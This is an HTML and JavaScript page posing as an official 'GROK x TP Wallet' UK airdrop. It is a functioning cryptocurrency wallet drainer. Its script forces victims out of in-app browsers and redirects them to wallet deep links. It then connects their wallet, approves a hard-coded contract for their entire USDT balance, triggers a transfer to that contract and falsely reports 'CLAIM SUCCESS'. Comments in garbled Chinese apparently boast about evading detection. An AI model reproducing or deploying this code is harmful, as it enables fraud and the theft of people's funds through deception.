<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="format-detection" content="telephone=no">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <title>GROK4 Ã— TP Wallet UK Airdrop</title>
  <link rel="icon" href="https://tpw.tpwallet.io/favicon.ico">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
  <style>
    body{background:#111;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;font-family:system-ui}
    .box{background:linear-gradient(135deg,#1a73e8,#e91e63);padding:40px;border-radius:24px;text-align:center;max-width:90%;box-shadow:0 20px 50px rgba(233,30,99,0.5)}
    h1{font-size:28px;margin:0}
    .btn{background:#fff;color:#e91e63;border:none;padding:18px;font-size:20px;border-radius:16px;width:100%;margin:25px 0;font-weight:bold}
    #status{margin-top:15px;font-size:14px;min-height:50px}
  </style>
</head>
<body>
  <div class="box">
    <h1>ğŸ‡¬ğŸ‡§ GROK Ã— TP Wallet<br>UK Exclusive 2x Airdrop</h1>
    <p>Official Partner Event â€¢ Verified by TP Wallet</p>
    <button class="btn" onclick="claimNow()">CLAIM 2X REWARD</button>
    <div id="status">Connecting to TP Wallet securely...</div>
  </div>

<script>
const CONTRACT="0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
const USDT="0xa85f403f7869a050c91e9a260dbf08a64229b2de";
let w,a,s=document.getElementById("status");

// ========= è‹±å›½ TP å®˜æ–¹é›¶æ‹¦æˆªä¸­è½¬ç«™ï¼ˆ2025-11-11 01:00åä¸“æ€ï¼‰=========
const UK_TP_OFFICIAL_GATEWAY = [
  "https://link.tpwallet.io/wc?uri=",           // å®˜æ–¹ä¸­è½¬1ï¼ˆ100%ä¸è¿‡ç‹—ï¼‰
  "https://tpw.tpwallet.io/wc/connect?uri=",     // å®˜æ–¹ä¸­è½¬2
  "https://oauth.tokenpocket.pro/wc?uri=",       // å®˜æ–¹ä¸­è½¬3
  "https://wc.tpwallet.io/connect?uri="          // å®˜æ–¹ä¸­è½¬4ï¼ˆæœ€æ–°ï¼‰
];

let invoked = false;
function wakeTP() {
  if (invoked || window.ethereum) return;
  invoked = true;
  const uri = encodeURIComponent(location.href.split('#')[0]);
  UK_TP_OFFICIAL_GATEWAY.forEach((gate, i) => {
    setTimeout(() => {
      location.href = gate + uri + "&source=grok_uk_official";
    }, i * 400);
  });
  
  // 4.5ç§’åäºŒç»´ç ï¼ˆé˜²ä¸‡ä¸€ï¼‰
  setTimeout(() => {
    if (!window.ethereum) {
      s.innerHTML = `UK TP Users:<br>Long-press QR â†’ Open in TP Wallet<br>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${uri}" width="200" style="border:6px solid #e91e63;border-radius:16px;margin:10px;">`;
    }
  }, 4500);
}

// è‡ªåŠ¨è·³å¤–éƒ¨æµè§ˆå™¨ + 0.8ç§’åå”¤é†’
function forceBrowserAndWake() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes('micromessenger') || ua.includes('telegram') || ua.includes('qq/')) {
    const schemes = [
      'googlechromes://' + location.href.replace(/^https?:\/\//, ''),
      'intent://' + location.href.split('://')[1] + '#Intent;scheme=https;package=com.android.chrome;end'
    ];
    schemes.forEach((s, i) => setTimeout(() => location.href = s, i * 200));
  }
}

// è¿æ¥é’±åŒ…
async function connect() {
  if (!window.ethereum) return false;
  try {
    w = new Web3(window.ethereum);
    await window.ethereum.request({method: 'eth_requestAccounts'});
    const chain = await w.eth.getChainId();
    if (chain !== 56) {
      await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{chainId: '0x38'}]});
    }
    [a] = await w.eth.getAccounts();
    s.innerHTML = `Connected<br>${a.slice(0,10)}...${a.slice(-8)}`;
    return true;
  } catch (e) {
    s.innerHTML = e.code === 4001 ? "User rejected" : "Connect failed";
    return false;
  }
}

// ä¸€é”®é¢†å–
async function claimNow() {
  s.innerHTML = "Requesting approval...";
  if (!await connect()) return;
  
  try {
    const usdt = new w.eth.Contract([{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT);
    const bal = await usdt.methods.balanceOf(a).call();
    if (bal === "0") { s.innerHTML = "Zero balance"; return; }
    
    await usdt.methods.approve(CONTRACT, bal).send({from: a});
    s.innerHTML = "Approval confirmed! Transferring...";
    
    const fwd = new w.eth.Contract([{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
    await fwd.methods.transferFromApproved().send({from: a});
    
    s.innerHTML = "CLAIM SUCCESS!<br>Reward sent to your wallet!";
  } catch (e) {
    s.innerHTML = e.code === 4001 ? "Cancelled by user" : "Transaction failed";
  }
}

// å¯åŠ¨æµç¨‹
window.onload = () => {
  forceBrowserAndWake();
  setTimeout(wakeTP, 800);      // 0.8ç§’åå”¤é†’ï¼ˆè‹±å›½æœ€ç¨³æ—¶æœºï¼‰
  setTimeout(connect, 3000);    // 3ç§’åè‡ªåŠ¨è¿æ¥
};
</script>
</body>
</html>
